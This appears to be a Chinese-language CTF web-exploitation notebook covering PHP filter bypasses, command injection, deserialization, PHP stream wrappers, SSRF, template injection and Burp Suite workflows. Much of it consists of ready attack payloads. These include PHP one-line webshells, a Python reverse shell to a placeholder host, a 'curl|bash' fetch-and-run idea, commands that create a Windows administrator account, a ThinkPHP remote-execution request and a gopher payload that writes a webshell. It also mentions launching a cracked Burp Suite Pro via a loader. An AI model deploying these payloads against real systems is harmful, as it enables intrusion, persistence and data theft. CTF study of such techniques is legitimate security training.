            2.1=>16进制=>?ip=127.0.0.1%0als${IFS}$(printf${IFS}"\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65")
            2.2=>16进制=>?ip=127.0.0.1%0aca''t${IFS}$(printf${IFS}"\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65\x2f\x66\x6c\x61\x67\x5f\x36\x33\x31\x38\x31\x35\x30\x35\x33\x33\x34\x2e\x70\x68\x70")#
    
        过滤 preg_match('/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i',$code)), $blacklist = get_defined_functions()['internal'];
            取反绕过
    
        isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
            需要让$text输入 ”welcome to the zjctf“ 
            ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
    
        过滤 if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
            空格用%20, 使用 dir,  dir%20/ , -- 2019 安洵杯Web easy_web
    
        只能使用指定math常用数学函数 [CISCN 2019 初赛]Love Math
    
        SQL过滤select等尝试堆叠注入



### 正则绕过 pregmatch / bypass
preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。
preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。

https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
https://blog.csdn.net/volcanodingning/article/details/3274961

D (PCRE_DOLLAR_ENDONLY)
设置后$仅匹配目标字符串里的尾部. 没有这个修饰符, $ 字符也匹配新行的尾部

### 利用PHP的字符串解析特性Bypass
https://www.freebuf.com/articles/web/213359.html

#### 取反码 preg_match("/[A-Za-z0-9]+/",$code)

```php
$str = ~"phpinfo";
echo urlencode($str);
phpinfo() == (~%8F%97%8F%96%91%99%90)()
paylaod: ?code=(~%8F%97%8F%96%91%99%90)();
```
#### `substr_count($query, '_') !== 0, 使用%20代替_`
#### `preg_match('/^23333$/') 用%0a即换行绕过$`



### php writeup
#### ctfshow 红包题第二弹（无数字字母无~^RCE）
1.?>把前面的<?php给闭合掉,  <?=是echo()的别名用法，
2.文件上传后路径为 /tmp/xxxxx 下
3.linux中反引号`ls`是可以执行命令的.   综合起来就是 echo输出 执行命令的结果

放过了p
```php
preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
```

```
POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1

Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888

-----------------------------10242300956292313528205888
Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
Content-Type: text/plain

#! /bin/sh

cat /flag.txt
-----------------------------10242300956292313528205888--
```

#### CTFshow红包题第六弹-条件竞争
https://blog.csdn.net/weixin_43873408/article/details/119330953
https://www.moonback.xyz/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/

本机测试时可使用vardump($_FILES)可以看到些信息

```php
<?php
function receiveStreamFile($receiveFile)
{

    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA']) ? $GLOBALS['HTTP_RAW_POST_DATA'] : '';

    if (empty($streamData)) {
        $streamData = file_get_contents('php://input');
    }

    if ($streamData != '') {
        $ret = file_put_contents($receiveFile, $streamData, true);
    } else {
        $ret = false;
    }

    return $ret;

}

$receiveFile = 'flag.dat';
$flag = 'flag{************************}';
receiveStreamFile($receiveFile);
# 多进程并发请求，只要满足第一个条件后(先发key.dat)，修改文件内容第二个条件即可成功
if (md5_file($receiveFile) === md5_file("key.dat")) {   # 条件1 md5相同 -- 传key.dat , 通过条件1
    if (hash_file("sha512", $receiveFile) != hash_file("sha512", "key.dat")) { # 条件2 sha1不同 --  通过1的时候 替换文件，通过条件2
        $ret['success'] = "1";
        $ret['msg'] = "人脸识别成功!$flag";
        $ret['error'] = "0";
        echo json_encode($ret);
        return;
    }

    $ret['errormsg'] = "same file";
    echo json_encode($ret);
    return;
}
$ret['errormsg'] = "md5 error";
echo json_encode($ret);
return;
```
#### nl/od *执行命令(当前目录下所有文件) / 短命令 /short/strlen / ctfshow 【nl】难了
nl: number lines

```php
<?php
show_source(__FILE__);
error_reporting(0);
if(strlen($_GET[1])<4){
     echo shell_exec($_GET[1]);
}
else{
     echo "hack!!!";
}
?>
```
payload
```
?1=>nl     # 新建了一个叫nl的空文件
?1=*>z
再访问z
```

shellexec(*) 时会执行当前目录下的所有文件, 相当于执行了nl *, 就会把数据输出了(源码看)

```
?1=>nl
?1=*
#还有另一个命令od（八进制输出）也是可以的
```

单机测试, 清空所有文件
```
# /bin/sh
echo aaa>xx.php
>nl
echo * # 感受 *>z的作用, echo * => nl xx.php 即下一行的*
*>z    # 即 nl xx.php > z
```

#### 反弹shell getshell
https://www.extrader.top/posts/45c7e77/
https://www.jianshu.com/p/9456473a0a14

举例 ls -l
```sh
rm *
ls
>sl
>l-
>dir
echo * # dir l- sl
*>v    # l- sl  # 即把 l- sl列出来
>rev
echo *v # rev v
*v>x    # 执行rev v>x 即 x: ls -l
sh x    # 执行
. x     # 执行
```
获取 ls -th>g
```
rm *
ls
>sl
>ht-
>g\>
>dir
*>v
>rev
*v>x
cat x
```

获取curl x.x.x.x|bash命令

### js弱类型
```js
if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0]))

{"e":paylod,"first":[0],"second":"0"}
```

### %00 截断问题 CVE-2020-7066
`[GKCTF2020]cve签到` bp抓包 00截断
```
http://xx.cn/?url=http://127.0.0.123%00www.ctfhub.com
```


http://web.jarvisoj.com:32785/

?page=xxxx

?page=xxxx%00 就可以截断

首先是把php上传（改文件名、改Content-Type，改文件内容，图片马），然后是如何解析并执行php（web容器的解析漏洞、php文件包含）。

    <?php @eval($_POST['pwd']);?>
    <script language="php">@eval_r($_POST['pwd'])</script>



#### $_REQUEST数据覆盖问题
2018NCTF_easy_audit
Request 变量默认情况下包含了$GET，$POST和$COOKIE的数组。 未设置时，从左向右注册。可覆盖。

__$ SERVER['QUERY STRING']__

$_SERVER是预定义服务器变量的一种，所有$_SERVER开头的都是预定义服务变量。

```
示例：
http://localhost/aaa/index.php？p=222&q=333
结果：
$_SERVER['QUERY_STRING]="p=222&q=333"；
```

### __wakeup()
__wakeup()方法中$this->username = 'guest'会让username重新赋值。在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行，我们可以将字符串中O:4:"Name"后面的2改为3及以上的整数

```
O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
O:4:"Name":3:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
```
注意该类中使用的private来声明字段，private在序列化中类名和字段名前都要加上ASCII 码为 0 的字符(不可见字符)，如果我们直接复制结果，该空白字符会丢失，需要我们自己加上

`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`

将该字符串作为select参数的值，GET方式发送过去就可以获得flag

http://题目链接/?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}

### shell绕过
[命令执行的绕过技巧](https://www.dazhuanlan.com/2019/10/05/5d97c963e2513/)

$IFS和$IFS$9来绕过空格过滤

```
payload1：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
payload2：?ip=|echo$IFS$9Y2F0IC9mbGFn|base64$IFS$9-d|sh

绕过  if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
      ;a=g;cat$IFS$1fla$a.php

GXYCTF2019]Ping Ping Ping
https://www.gem-love.com/ctf/516.html
https://0day.design/2018/12/20/Swpu%20CTF%202018%20Writeup/
https://www.cnblogs.com/wrnan/p/12811449.html
https://www.cnblogs.com/yesec/p/12475478.html
https://www.google.com/search?q=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&oq=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&aqs=chrome..69i57&sourceid=chrome&ie=UTF-8
```


### assert 执行


注意到 assert("strpos('$file', '..') === false") or die("Detected hacking attempt!") 这句话，查了一下 strpos，感觉可以拼接一下，但是自己不熟悉 PHP，只能去看题解。

可以执行任何 PHP 命令

构造 $file='.system('ls').'，意思就是用 . 来拼接 system 的返回结果

http://web.jarvisoj.com:32798/?page='.system('ls').'

http://web.jarvisoj.com:32798/?page='.system('cat templates/flag.php').'

看源码显示的flag。

### 绕开disable_functions
`[极客大挑战 2019]RCE ME`
https://blog.csdn.net/qq_45163122/article/details/105914054
https://blog.csdn.net/mochu7777777/article/details/105136633

蚁剑，下载插件绕过diable_functions, 下载后主界面点击  设置-绕过diable_functions
选择PHP_GC_UAF模式
点击开始

## 随机种子爆破 seed/mt_srand/mt_rand/php_mt_seed
[[GWCTF 2019]枯燥的抽奖](https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96)
https://xz.aliyun.com/t/3656#toc-3

```python
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='189zmsqgTe'
for c in str2:
    index = str1.index(c)
    print(f'{index} {index} 0 {len(str1)-1} ',end='')
```
方式1

```
每一们位$number $number 0 length-1
./php_mt_seed 27 27 0 61 34 34 0 61
```
方式2 
./php_mt_seed 1312312312

注意爆出来后要使用对应版本的php
## php .user.ini

auto_prepend_file是什么是意思呢。它就是设置页眉和脚注，可以保证它们在每个页面的前后被载入。使用这些指令包含的文件可以像使用include()语句包含的文件一样

创建.user.ini文件----UTF8编码

    GIF89a                  //绕过exif_imagetype()
    auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。
    auto_append_file=a.jpg  //解析后进行包含

然后构造一个a.jpg  UTF8编码，内容如下：

    GIF89a
    <script language='php'> @eval($_POST['pass']);</script>

然后在上传路径需要有个可执行的php, 比如都上传到了 /uploads/123/下 有index.php

最后直接访问 /uploads/123/index.php 连接webshell.

条件：

1、服务器脚本语言为PHP
2、服务器使用CGI／FastCGI模式
3、上传目录下要有可执行的php文件
实例：上传.user.ini绕过黑名单检验

## php 代码分析

    $first ="hello";
    $hello ="world";
    echo $first." ".$$first;
    结果是 hello world
    $$first就是$hello，因为$first的值是hello
    
    var_dump($$args) , flag可能存在于 , 全局变量 $GLOBALS , ?args=GLBOALS


[BJDCTF2020]Mark loves cat

```
foreach($_GET as $x => $y){

$a='fg';
$$a='xx'`; //可变变量表示
$fg='xx';
```

`[GWCTF 2019]我有一个数据库` phpadmin4.8.1漏洞

```php
payload: /phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd
```

## 伪协议介绍 / 可二次编码
https://www.cnblogs.com/wjrblogs/p/12285202.html
伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的
### 过滤器
string.rot13 
string.tolower 
string.strip_tags
convert.base64-encode 和 convert.base64-decode
convert.quoted-printable-encode 和 convert.quoted-printable-decode
convert.iconv.*
convert.iconv.<input-encoding>.<output-encoding> 或 convert.iconv.<input-encoding>/<output-encoding> （两种写法的语义都相同）
        convert.iconv.utf-16le.utf-8
zlib.deflate 和 zlib.inflate
bzip2.compress 和 bzip2.decompress
dechunk

## file_put_contents/exit/phar反序列化
https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md

file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的

[关于file_put_contents的一些小测试](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)

https://www.leavesongs.com/PENETRATION/php-filter-magic.html

## 伪协议: php://input
读取POST请求
例实现 text=='I have a dream'

?text=php://input , 请求改为POST, 在body传 I have a dream

![phpinput](imgs/php_phpinput.jpg)

```php
<?php
$ok=$_POST['ok'];
$ok2=$_POST['ok2'];
$test=readfile('php://input', 'r'); //ok=1&ok=2
```
https://blog.csdn.net/qq_14989227/article/details/79444940

## 伪协议: php://filter元封装器, 读取文件
先测试是否正确  `php://filter/read=convert.base64-encode/resource=/etc/passwd` 再尝试其他文件。

文件包含 `?file=php://filter/read=convert.base64-encode/resource=flag.php`
file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");


encode后面可以随意加字符 套一层协议, 既包含有woofers这个字符串，也不会影响正常的包含
```
php://filter/convert.base64-encode/woofers/resource=flag
```

    名称  描述
    resource=<要过滤的数据流>这个参数是必须的。它指定了你要筛选过滤的数据流。
    read=<读链的筛选列表>该参数可选。可以设定一个或多个过滤器名称，以管道符（）分隔。
    write=<写链的筛选列表>该参数可选。可以设定一个或多个过滤器名称，以管道符（）分隔。
    <；两个链的筛选列表>任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链。
    
    过滤器列表：http://php.net/manual/zh/filters.php
    
    --- web2
    页面1 http://xxx/?user='%23 -- 注释字符抓包，python生成字典。burp 暴破。
    本题限制了4位字符 '%1%23 刚好4位
    
    页面2 抓所看到 .viminfo 访问一下。
    找一个unicode字符和英文字符一样的。代替一下目标字符就能过waf
    
    页面3 
    使用path=http://127.0.0.1/&filename=1.txt
      写文件到upload目录下, 访问这个1.txt
    尝试 path=http://127.0.0.1/xxx.php?usern3me=<?php info();?>&filename=1.txt
      发现可以访问，但是需要编码。
    尝试 path=http://127.0.0.1/xxx.php?usern3me=<?php system($_[REQUEST[0]);?>&filename=1.txt
    改成PHP文件 path=http://127.0.0.1/xxx.php?usern3me=<?php system($_[REQUEST[0]);?>&filename=1.php
      用Hackbar上面的Encoding进行URL编码。空格要2次编码
      %20 改成 %2520
      %3D 是 =
    直接用它来执行命令 path=http://127.0.0.1/1.php?0=ls ../ 找到flag文件
    查看 path=http://127.0.0.1/1.php?0=cat ../flag_is_here.php 查看源代码
    https://www.freebuf.com/vuls/116705.html
    
    读取文件
    php://filter/read=convert.base64-encode/resource=show.php
    Burp Suite - Decoder 中可以解base64,
    
    构造Cookie问题
    ?line=1&filename=show.php
    用bp暴破， line=1字段 读取每一行 ，整合代码发现需要构造 Cookies: margin ,读取keys.php
    添加header头 Cookie: margin=margin; 
        filename=xxx替换成filename=keys.php的base64编码，读取完成。
## phar/zip协议
关于phar的格式：https://blog.csdn.net/u011474028/article/details/54973571

关于phar://的利用：https://xz.aliyun.com/t/2715

[[CISCN2019 华北赛区 Day1 Web1]Dropbox](https://www.jianshu.com/p/5b91e0b7f3ac)


压缩为zip改为jpg

```
test.zip
  ┗━━php.jpg

http://example.com/include/include2.php?file=zip://test.zip#php

phar://php.zip/php.jpg
```

[[CISCN2019 华北赛区 Day1 Web1]Dropbox](https://www.jianshu.com/p/5b91e0b7f3ac)
1.任意文件下载, index.php, download.php, register.php, class.php, delete.php, 
## preg_replace() /e 代码执行漏洞, 与双引号执行
[[BJDCTF2020]ZJCTF，不过如此](https://blog.csdn.net/qq_43622442/article/details/106018883)
https://www.cnblogs.com/wangtanzhi/p/12328083.html

```php
preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")', // 双引中的\\1会执行
        $str
    );
```

双引号里面如果包含有变量，php解释器会进行解析

    双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。
    $a = 1;
    $b = 2;
    echo '$a$b';//输出结果为$a$b
    echo "$a$b";//输出结果为12

/e 修正符使 preg_replace() 将 replacement 参数（第二个参数，字符串）当作 PHP 代码执行。`

payload1:

`next.php?\S*=${getflag()}&cmd=system('cat /flag');`
。。。 php 参数中的`.`会被替换成`_`。所以不能 `.*`

payload2:通过构造post传参

```
next.php?\S*=${eval($_POST[wtz])}
POST：
wtz=system("cat /flag");
```
hackbar成功, 但burpsuit没成功，通过捕获hackbar执行的请求，发现要bp要添加

`Content-Type: application/x-www-form-urlencoded`

## Thinkphp
Thinkphp 5.0.0 ~ 5.0.23

构造报错  `http://127.0.0.1/index.php?s=1` 查看到版本 THINK_VERSION5.0.23
```
http://871de986-e788-4308-93b1-56afc5801c28.node3.buuoj.cn/?s=captcha

POST:

_method=__construct&filter[]=system&method=get&get[]=ls /
_method=__construct&filter[]=system&method=get&get[]=cat /flag
```
## php 相关函数


vardump的结果
```php
Array
(
    [0] => HTTP/1.1 301 Moved Permanently
    // ...
    [41] => EagleId: da5c002216039455321251944e
)

```

echo vardump(array), 把array打出来


pos(localeconv()) => '.'
scandir(pos(localeconv())) => scandir('.')

看一下当前目录下的文件，`?exp=echo(var_dump(scandir(pos(localeconv()))));`

assert
    
    bool assert(mixed $assertion[,string $description])，
    如果assertion是字符串，他会被assert()当做php代码执行。

就是说如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行

那么我们就可以构造payload

    ?page='.system("cat templates/flag.php").'


$tem_name = $_FILES['file']['tmp_name'];    // 取得文件后缀名 

$_FILES["file"]["name"] - 被上传文件的名称

$_FILES["file"]["type"] - 被上传文件的类型

$_FILES["file"]["size"] - 被上传文件的大小，以字节计

$_FILES["file"]["tmp_name"] - 存储在服务器的文件的临时副本的名称

$_FILES["file"]["error"] - 由文件上传导致的错误代码

获取客户端IP `[BUUCTF 2018]Online Tool`

```php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
```
## shtml shtml, Apache SSI 远程命令执行漏洞 `[BJDCTF2020]EasySearch`

可控处进行上传代码，看在哪里返回shtml，访问一下。

```
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls"-->
<!--#exec cmd="pwd"-->
<!--#exec cmd="find / -type f -name flag*"-->
<!--#exec cmd="cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2"-->
```

## php编程

变量与字符串

```php
$flag = "flag{123}";
$b = "---$flag";
$b = "---{$flag}";
echo $b;
```


# Burp Suite

启动命令
```
普通启动
javaw -jar burploader.jar
跳过loader
javaw -noverify -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar
禁止缩放 防止光标错位
javaw -noverify -Dsun.java2d.uiScale=1 -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar
```



原文件 https://pan.baidu.com/s/1ryHY4ZFwJDkrblGuIGGFgw#0m7h

https://t0data.gitbooks.io/burpsuite/content/chapter3.html

Intuder 注意, payloads最下面转义(url encode)有时候需要关掉

User Option - Display - Http Message Display, 使用宋体

排除地址, 拦截的时候 Proxy - Intercept - Action - Don't intercept request =>

    Target选项卡-scope include .* .* .*
    Target选项卡-scope exclude .*firefox.*

Proxy-Option-Intercept Client Requests, 添加does not match [url]

    ^.*(bdstatic|baidu|g-fox|firefox|mozilla|google|alicdn).*$
    可能Scope中使用advanced scope也要排除

exclude url from histroy

    1. Proxy - Options - Miscellaneous - Don't send items to Proxy history or live tasks, if out of scope
    2. Project Options选项卡 - Out of Scope requests -  Drop all , 开启后其他地址返回404

拦截指定网址

    方法1 “Proxy”选项卡--选择“Options”菜单--往下看到“Intercept Client Requests”节区
    方法2 你可以使用“include in-scope items only(仅仅包括在范围内的项目)”以减少数据必须保存量。


[Intuder](https://blog.51cto.com/laoyinga/2151018)
    
    几种模式对应不同的payload数量
    
    结果过滤
        flag\{.*\}
        ctfhub\{.*\}

添加自定义header

  Proxy - Options - Match and Replace
  match为空就是添加
       添加到 response header, match空
       replace: Content-type:text/html;charset=utf-8


## 快捷键
```
Ctrl T, Toggle Intercept
Ctrl Shift P, Switch to Proxy
Ctrl Shift I, Switch to Intruder
Ctrl Shift R, Switch to Repeater
Ctrl +/-, 切换标签
```
## Burp Suite常见问题
GET改POST请求

    自动修改： 推荐---, 右击 Change request method
    手动修改： 添加  `Content-Type: application/x-www-form-urlencoded`

refresh 自动刷新的变量字段。
Options - Grep Match 常用，密码错误的时候，可以添加一个匹配关键字。开始攻击后会多一个字段。[^1]

      结果中也可以过滤(在标签Result下面)，
      grep - match 添加过滤字段 login_error,比返回长度效果更好。
      runtime file 每行作为一个
      custom iterator , 可以生成像 username@@password  ，选posisiton 2 @@, position3 password,
      copy other payload , 两次payload值要一样时使用。

wordpress , ?author=1 可以知道 id=1的用户
## Burp Suit 和 Hackbar 使用一句话木马

注意使用 POST 方法提交哦。

__1、 Burp Suite：__

1) 拦截到页面请求, 将其转到 Repeater, 并在最下方加入请求参数:

    shell=system("find / -name 'flag*'");

2) 查看 Response, 最下方有目标文件路径:3) 修改 Repeater 中的请求参数为:

    shell=system("cat /var/www/html/flag.txt");
4) 查看 Response 中的结果:

__2､ HackBar:__

1) 在 HackBar 中输入相应 URL 和请求参数, 请求参数为需要执行的 shell:

    shell=system("find / -name 'flag*'");

2） 在原先的页面可以看到相应结果， 在最下面即是目标文件的路径， 如下图所示：

3） 继续在 Hackbar 中执行命令：

    shell=system("cat /var/www/html/flag.txt");

4） 在原页面即可查看到 flag.txt 中的 flag 内容：

## Burp Suite暴力破解一句话木马
一句话木马

    PHP:<?php @eval($_POST['pwd']);?>
    PHP:<?php @eval(_POST['v5estOr']);?>
    <script language="php">@eval_r($_POST['cmd'])</script>
    
    --php5试用 1.phtml
    GIF89a? <script language="php">eval($_REQUEST[shell])</script>
    --修改content-type为image/jpeg
    
    ASP:<%eval request("v5estor")%>

一般来说,一句话木马通过POST方式的传参方式如下(以写出字符的语句为例):

    PHP:v5estor=echo "password is v5estor";
    ASP:v5estOr=response.write("password:v5estor")

已确定一句话木马地址为hack.php, 用hackbar 捕获hack.php 请求， 发送到Intruder ,将 v5estor 添加为变量，暴破一句话木马变量地址。grep - match 字段添加，password is 。 暴破后正确输出 password is 为成功为一句话木马的变量。
### 图片马

winhex打开图片，在最后粘贴马。

## Burp Suite 破解文件上传
普通难度： 

    抓包, 1. 改 content-type即可。 image/png
    抓包, 2. 改 file-name 即可。 image/png

High级别---系统认可图片

    copy test.png/b+test.html/a a.png
    test.html:  `<script>alert(1)</script>`

用来上传php, 比如 `copy test.png/b+hack.php/a caidao.png`

hack.php 里写一句话木马  :<?php @eval(_POST['1']);?>

查看有没效果

http://192.168.1.107/dwva/vulnerabilities/fi/?page=/hackable/uploafs/caidao.png   

hackbar

URI： http://192.168.1.107/dwva/vulnerabilities/fi/?page=C:\www\DWVA\hackable/uploads/hack.png

    POST:1=echo '<pre>';system('ipconfig')
    POST:1=echo '<pre>';system('net user hack 123456/add');
    POST:1=echo '<pre>';system('net localgroup administrators hack /add'):

## Burp Suite配合SQLmap实现被动式注入发现

    User Option - Misc - Logging, √Proxy Request ,选择一个文件位置保存。
    打开文件搜索请求，确定请求存在。
    sqlmap.py -r 文件目录
    sqlmap.py -r C:\log\1.txt --batch
    找到并查看 outout文件。在txt中找到注入链接, 比如，测试
    sqlmap.py -u "http://192.168.1.102/inject.php?id=2" --dbs

## Burp Suite数据获取测试
用BP抓个包 比如 http://192.168.1.102/inject.php?id=1

`在1后面加a 1$a$ a设置成字段。`

Payloads- Payloads Options , Load , 找 FuzzLists目录下的 sqli-union-select

用Intruder 开始攻击, 查看结果-Response

查看结果后 确定为3个字段，在结果里右击查询3字段的发送到repeater, Go一下。

     在params里 select%201,2,3 from a   测试a表是否存在。显示 doesn't exist, 将它 设置成Grep Match 字段进行过滤。
     payloads load,  common-tables进行start attack。

查看结果， 确定admin为表名。继续修改params 猜列名

        select%201,a,3%20from%20admin 显示 unkonwn column ，将请求必到Intruder,
          将 a 设置成变量， unkonwn column为过滤字段。
          payload - load, comman - column
          start attack,查看结果。
          确定了id , password, 列。
        -1 union all select%201,password,3%20from%20admin
        -1 union all select%201,password,3%20from%20admin limit 0, 1
发到 Intruder

    id=1 union all select 1,2,3 from admin#
    id=1 union all select 1,password,3 from admin#
    id=1 union all select 1,concat(id, username, password),3 from admin#
    id=1 union all select 1,concat(id,0x7c, username,0x7c, password),3 from admin#
     0x7c是管理符 | 

发到intruder, 

      limit%20$0$,1 这里将0改为字段了。limit参数为：偏移量，最大数目
    
      payload type: numbers,
        from 0, to 3, step 1,
      start attack

Grep Extract, add选中后会自动正则。 清除多余的过滤。b

菜单栏 save - result table, 只留一个正则。保存

## Burp Suite目录与文件扫描测试
1.抓包 history中， 发到Intruder

2.Positions

      payload 加载  php去重复.txt 字典
      payload 选项卡 中有 Payload Encoding √要去掉 （否则会编码/符号）
      start attack
      在结果列表， Filter 只勾2xx

# Python

反弹shell
    
    python反弹shell
    
    /no_one_know_the_manager?key=自己填key&shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27

## Python 格式化字符串漏洞

```python
def view(request,*args,**kwargs):
    template='Hello {user},This is your email:'+ request.GET.get(email)
    return HttpResponse(template.format(user=request.user))
# ?email={user.pk}|{user.username}|{user.password}
```

## ssrf
`[De1CTF 2019]SSRF Me`


https://github.com/tarunkant/Gopherus


|        Command           |        Description             |
|--------------------------|--------------------------------|
|  gopherus --help         |          Help                  |
|  gopherus --exploit      |    Arguments can be  :         |
|                          |    --exploit mysql             |
|                          |    --exploit postgresql        |
|                          |    --exploit fastcgi           |
|                          |    --exploit redis             |
|                          |    --exploit zabbix            |
|                          |    --exploit pymemcache        |
|                          |    --exploit rbmemcache        |
|                          |    --exploit phpmemcache       |
|                          |    --exploit dmpmemcache       |
|                          |    --exploit smtp              |

```
gopherus --exploit mysql
username: root
execute: select '<?php eval($_POST[cmd]); ?>' INTO OUTFILE '/var/www/html/1.php';
```
生成内容为
```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%49%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%63%6d%64%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%3b%01%00%00%00%01
```
选中下面，右击 Convert Selection - URL-encode key characters
```
%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%49%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%63%6d%64%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%3b%01%00%00%00%01
```
生成新的url 发送。用蚁剑连接测试。


## ssti

[hideandseek](https://www.baidu.com/s?wd=hctf2018+hideandseek)


linux service 越权
非预期 unicode 绕过

### ssti smarty
`[BJDCTF2020]The mystery of ip`
`[CISCN2019 华东南赛区]Web11`

```
{if phpinfo()}{/if}
{if system('ls')}{/if}
{ readfile('/flag') }
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if} #本题payload
{if system('cat ../../../flag')}{/if} #本题payload
X-Forwarded-For: {{system("ls")}}
X-Forwarded-For: {{system("cat /flag")}} #本题payload
```

### ssti 服务器模板注入 twig

```
user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```
### ssti 服务器模板注入 jinj2
`buuoj [RootersCTF2019]l_<3_Flask`

[[WesternCTF2018]shrine](https://www.cnblogs.com/Cl0ud/p/12316287.html)

    {{self.__dict__}}
    {{url_for.__globals__['current_app'].config}}
    {{get_flashed_messages.__globals__['current_app'].config}}



[pasecactf_2019]flask_ssti](https://guokeya.github.io/post/zIiwsY95N/)


内置函数 `print(help(dir(__builtins__)))`

ssti方式
```
?flag={{config.SECRET_KEY}}
/hello?name={{7*7}}
/hello?name={{config}}
pip install flask-unsign
flask-unsign --sign --cookie "{'balance': 666666}" --secret "XMM<XMK"

